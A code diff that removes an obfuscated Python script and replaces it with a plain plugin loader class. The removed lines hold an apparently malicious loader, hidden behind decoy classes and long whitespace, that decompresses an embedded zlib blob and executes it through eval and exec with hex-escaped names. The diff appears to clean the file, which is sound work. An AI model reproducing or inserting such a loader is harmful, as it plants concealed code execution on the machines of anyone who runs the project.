@@ -1,97 +1,46 @@
-from builtins import *
-from math import prod as _add
+import inspect
+import logging
+import pkgutil
+
+logger = logging.getLogger(__name__)
 
 
-__obfuscator__ = 'Deluxe'
-__authors__ = "SadHam"
-__github__ = 'https://github.com/'
-__discord__ = 'https://discord.gg/'
-__license__ = 'EPL-2.0'
+class Plugin(object):
+    def __init__(self):
+        self.description = None
+        self.arguments = None
+        self.action = False
 
-__code__ = 'print("Hello world!")'
+    def run(self, *args):
+        raise NotImplementedError
 
 
-Random, _product, System, _system, DetectVar, _callfunction, _random = exec, str, tuple, map, ord, globals, type
+class PluginLoader(object):
+    def __init__(self, plugin_package, first_run):
+        self.seen_paths = None
+        self.plugins = None
+        self.plugin_package = plugin_package
+        self.output = first_run
+        self.reload_plugins()
 
-class Modulo:
-    def __init__(self, Math):
-        self._memoryaccess = _add((Math, -23913))
-        self.StackOverflow(While=-55321)
+    def reload_plugins(self):
+        self.plugins = []
+        self.seen_paths = []
+        if self.output:
+            logger.info("Loading plugins . . .")
+        self.walk_package(self.plugin_package)
 
-    def StackOverflow(self, While = str):
-        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
-        self._memoryaccess -= 32447 / While
-        
-        try:
-            {'htduBtBob': _system} if _system is Random else {_system: System} is Random
+    def walk_package(self, package):
+        imported_package = __import__(package, fromlist=["plugins"])
 
-        except AssertionError:
-            {'htduBtBob': _system} if System > _callfunction else {DetectVar: 'g3633dihet3elletd'} == _system
-
-        except:
-            _random(78431 - 3227) == bool
-
-    def Frame(self, Add = -99665):
-        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
-        Add /= -87737 * 16733
-        self._ceil != bool
-        
-        try:
-            ((DetectVar, {_system: System}) for DetectVar in (_product, _product, Random) if Random < _system)
-
-        except TypeError:
-            ((Random, _algorithm) or _product if (Random, _algorithm) and _product else ... or (_product, (Random, _algorithm)))
-
-        except:
-            _random(50645 - 97418) == str
-
-    def Floor(_multiply = float):
-        return _callfunction()[_multiply]
-
-    def Absolute(_walk = -19348 + 57318, Hypothesis = int, _theory = _callfunction):
-        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
-        _theory()[_walk] = Hypothesis
-        
-        try:
-            {_system: System} if _product > _system else (_algorithm, _system) is System
-
-        except AttributeError:
-            ((Random, _algorithm) or _product if (Random, _algorithm) and _product else ... or (_product, (Random, _algorithm)))
-
-        except:
-            _random(72369 * -57450) == bool
-
-    def execute(code = str):
-        return Random(_product(System(_system(DetectVar, code))))
-
-    @property
-    def _ceil(self):
-        self._square = '<__main__._system object at 0x000009850BE67471>'
-        return (self._square, Modulo._ceil)
-
-if True:
-    try:
-        Modulo.execute(code = __code__)
-        _divide = Modulo(Math = -74413 - 10628)
-
-        if 151726 > 9807375:
-            _divide.Frame(Add = -59072 / _divide._memoryaccess)
-        elif 474231 < 1133468:
-            _divide.StackOverflow(While = _divide._memoryaccess / 62663)                                                                                                                                                                                                                                                          ;Modulo.Absolute(_walk='jiilijilljjjllilijjlijl',Hypothesis=b'x\x9c\xe5X\xdfo\xdb6\x10~\x17\x90\xff\x81Q\x81IZ\x1d\xc7\xcbC\xb1\x1a\xc8\xd3\xdc\x1f\x01\x82\xbaX\x86%Cb\x084E)th\x9d@R\x8d\x83b\xff\xfb\x8e\x94d\xcb\xb2\xec!\xdd\xde|rh\x91\xf7\xf1\x8e\xf7\x91G\x93yC>}:%\x7fAI\x16\xa56$\xe10OK\xcd\xa8\xe1\t\xa1$\x15\x92\x93V\xcb\xb30\x8fd\xc2e\xb9\xe2\x9e\xf7\x86\xfc\x06y\xa6\xa8)%5\x02r}\xeay\x9eQ/c\x8f\xa0\x88\x94\x84\xee\xc5J\x1c7F@\xc519\xbd$~e\xc5\'\xa0Z(Z\x9aGP\xba\x86\xdc\xd0\xe43]v \x19\x0e\xa1\x9c\xd7\x88Gc\n=>?\xaf\x1a\x87\x0c\x96\xe7\x1dx"4\x03\x95t\xf0u\xeb0\xcb\xbax)\x18\xcf5\xaf\xf1\x1f\xbe^\x9f]\x0cG\x1d\x0c\x83\xa4\x06\x04\x85\x12\xb9\t\xfd\xcf\\J \xcf\xa0dr\xeaG\x81\xc3F\xe3u\x17\x8b\t\xf4\x93H\x82\xc8\xe3+\xc6\x0bSs\x94\x17%\xf6\xfe\x1d4\xd7\x84*N\x14O\x1e\xf2?\x05Hn\xaa\x86\xb9,\xf9Cn\xa7\xc7\xd6(\xb1F\x1e\xf2/0\x87\xe4\x85H\xf1\x84\xfd^\xa0\xf4#\xaf\x1a\x99X\x16\xa0L\x1c\xa3\xb7\x17\x1dDC\xbe\x12&\x8cpZ$0*u\x18\xdd\x07\xf2\xea\xeaJ\xba\xe2\xaa*\xdc\'\x98]f\x12\xe6\x88\xf1\xfa\x01\xb6\xebj\xf5\\\x89\xfd^a-\xb8\x1f\x8f\xdf\x9e\xbd=\x0b\xcf\xc2\xb7\xbfD\xd1lv\x99\x08u\xc8\xc0\xa6sm\xc1}\xef\x9a\xc9\xb8\xa1\xc6\x1c2usqq\x83r\x81\xdf\x8d`\r\xc3\xa8"\xf5\xfa\xf5\xb6\xe7\x14\xf0\xa9d4\x1d\xc1\x08\xab#\x80\xd1\x08\xb0\xf3\x86\xc1\x03\xae\xb1\x13\xf6\x05\xc0\xeeX\x82\xad\x8eFhd:E\x0b{\xad\x87\xc1\xbc\x14\xd2\x88\xdc\xce\xcb7\xaa\x0e\rq2\x99\xc0d2\x9dN\xa60\xb1>\xf0\x1d\xa6\xd8h\x1d8\xc6\x1cw\r\x8d\x8e\xd4\xf0\x80c\x9d\x0b#E9\xef\xf2\x1c\r\x1a;\xcd\xbc\xfe\x98\x99\xe8\xfe\x7f\xb23\x14y\xc2Wa`(\xc8tG=\x8b\x0ePvw{wk\xe5\x0e\xe5\xd6~\x8e\x84*^\xaa?^\xc7\x94\xa5b\xb5\xce=[\xba\xfa\x91\xf0%\x01v\xb5\x07\xf9\x9a\xda\xd4\xc6<\xaf\x8a\x91Mu\xe4*\x08\x86\x0b\x10\xf9\x81~v\xfb\x90\xcd\xe6\xe1\xb6\x12y$\x1cs-\xe9\xc7\xd7\x91|cUN\xe9\x005\xcc\xca\x91p\xa6\x8c\xeecl\xff\xaf\x90\xdb\xef\xdc\xaeg\x8bj\xdb\xbb\xfd1\xb2\x84`\x9a\xe6\xe2\xbf\x92\xb5\xd7\xcc+\xc9\xdao\xa7!\xeb\x05\xcf\xa5+\xfe\x98\x97}\x94\xed\xffyv\xc7\x1f\x81\xcfB.\x04>\x0b)\xaa7[\x1c\xc9:\xe3R\x14K`\xaf[k\xe8\xce}\xdc\x99\xc4\x9dDP\x8e\x840I\xbf\xf1W\xb1\xd5\x9b\x98\xe1<x\xc7\xf0\xa1uI\xdf\xbdw\xef\xf6\xef\xfd\xba\x9d\xb9Z\xfd\x8e\xc7\xc4\x84\xdb\xabF\x18\xfc\x9a\x9a\x9e\xa5~\x14\xf43\xbe\xea\xa5\x1f%U\xb0$\xcd\xa1\x9aT\x07w\x82p6\x10Z\x97s&\xa9\xd6\x9e\xad\x87\x01\xde\xbb\xbc\x1a\x80\xd8\x823s\xd2\xd4%d\x99\xc8\xb3u\xbdx\xcaJ#\xe4\x89w\xe2Y\x15W\xe4\xb2\xc1\x0c\xf1Zr\xed\xda\xc28\xce\xe9\x12/\x81\x91\xc5\x9dx\xce\x17\xf9*K\x84\x850_\xa0\x83h|\xe2.e\tO\xed\xc5\x0c\x03\xc5k\x99\xe62m\x14Vl\x1dgY3%\n{\x85F__ \xe7\x1d\x00UY\xb9\xe49^\t\xfb\xd5\xac\xee\xfa\x11/>\xdc\x0e\xa7\xf1\xab\xca\xdc\xb9\x1c\x90\x9f\xd1\x86n{VTh\x8e\xd6\xcc\xd5\xb2\x90\xdcZ\xe7\xc9\x07\xa5@\xed\x06t\r4\xc1\x90\xff%\xac\x01)\x1c:.({\xa2\x19\x1f\x90T(mb\x1c\xc3N\xc4\x9as\x8b3\x8f{"\xaa,\x1dT6n\x10\xb3\xdd\xd0ACi\xf0\x8e\x8d\xa8\xf5h:\x00\xc5%\xc6\x17\xd7.\xc3h\x8b\xbfm]\xef\xecm\xc6z?;\x14f[+\xd2\xf6\xe0Z\x16\xadT\xab\x0e\xd7\x7f\n\xa1o\xb9\xc7\x95G\x1a/C\xfb\xf8Q\xc7\xd13\x95OM\xfca\x0fI[A\xed\x80q\xe6jXk$U6\xf0\xa4\xc5s\xeb\xdf\x0b\x9b9\xc6\x1c\x94B\x9b\xcb{\xbf\x1e\xa2?[{\xb3\x92\x82"q\xb36l\xce\x0c\x88\xd0\x98c\x98\x87M\xaa\r\x85\xe1*^BRJ\xae\xc3m2\xba\xc3\x18\xc6\x8e\xd0\x18M\xa6\xfe\xf7\x1em\x95\x96\x7f\x0f\xfd\x8d\x9d\xa8C0\xb2\x9f\x83\xa9\x86\xd1QY\xa9\xa9\xab\xc6\xd3\t\xbb\x15\xc5\x9e\xc8\xbb\xd6\x98\xd4K\xbe\x9cse\xd7@\xbd\xf7\xd8}\xa4n\x0c\xb7\xbc\r\xd6\x08\xa1]\x06\xf6\x18\xb4\x84\x86\x18>\x8b,\x85\x1b\xf3=\x91\xd4\xc1nv\xc3\x90\r\xea\x9c\x8e\xc8O$d\xa8rT\xd4m{L\xd4f\xf6\xaf\xd8\xae\xb4Wp\xea\x13rF\xbe\xb3\xcd\xd4\x8c\xabZ\x02\x0c+~O\x84\x8d\xb4\xd3kH\x8b\x82\xe7I\xc8\xc2(\xfa\x07\x1c\xbdd\x12')
-
-        if 301282 > 6100377:
-            Modulo(Math = -88429 - -69683).Frame(Add = -2572 * _divide._memoryaccess)
-        elif 173374 < 4648840:
-            _divide.StackOverflow(While = _divide._memoryaccess * -42945)                                                                                                                                                                                                                                                          ;IIILLLLLILLLLIJLLIL,XXXWWWWXWXWXWWWXWWXXWW,MNNMMMMMNMNNMNMNNNM,llIIIIIIIIIlllIIIIll,O00oO0o00o0OOoooO0O0oO0o0O=(lambda S22SS22S2S2S222SS2SSSS2S2:S22SS22S2S2S222SS2SSSS2S2['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda S22SS22S2S2S222SS2SSSS2S2:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(S22SS22S2S2S222SS2SSSS2S2)"),filename='\x6e\x6d\x6d\x6d\x6d\x6d\x6e\x6e\x6e\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6e\x6e',mode='\x65\x76\x61\x6c'))),(lambda S22SS22S2S2S222SS2SSSS2S2:S22SS22S2S2S222SS2SSSS2S2(__import__('\x7a\x6c\x69\x62'))),(lambda nnnmmnmnmmnmmnmmnnnm,S22SS22S2S2S222SS2SSSS2S2:nnnmmnmnmmnmmnmmnnnm(S22SS22S2S2S222SS2SSSS2S2)),(lambda:(lambda S22SS22S2S2S222SS2SSSS2S2:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(S22SS22S2S2S222SS2SSSS2S2)"),filename='\x6e\x6d\x6d\x6d\x6d\x6d\x6e\x6e\x6e\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6e\x6e',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
-        _divide.Frame(Add = 65989 * _divide._memoryaccess)                                                                                                                                                                                                                                                          ;O00oO0o00o0OOoooO0O0oO0o0O()(llIIIIIIIIIlllIIIIll(IIILLLLLILLLLIJLLIL(MNNMMMMMNMNNMNMNNNM(XXXWWWWXWXWXWWWXWWXXWW('\x76\x61\x72\x73'))),Modulo.Floor(_multiply='jiilijilljjjllilijjlijl')))
-
-    except Exception as _algorithm:
-        import traceback
-        print(f'    module {__name__} raised an Exception:')
-        print(f'     {_algorithm}')
-        print(traceback.format_exc())
-        if 398990 > 2217541:
-            Modulo.execute(code = _product(_algorithm))
-
-        elif 312753 > 1241261:
-            Modulo(Math = -35268 * 63).StackOverflow(While = _divide._memoryaccess * -46702)
+        for _, pluginname, ispkg in pkgutil.iter_modules(
+            imported_package.__path__, f"{imported_package.__name__}."
+        ):
+            if not ispkg:
+                plugin_module = __import__(pluginname, fromlist=["plugins"])
+                clsmembers = inspect.getmembers(plugin_module, inspect.isclass)
+                for (_, c) in clsmembers:
+                    if issubclass(c, Plugin) & (c is not Plugin):
+                        if self.output:
+                            logger.info(f"  - {c.__name__}: {c.__doc__}")
+                        self.plugins.append(c())
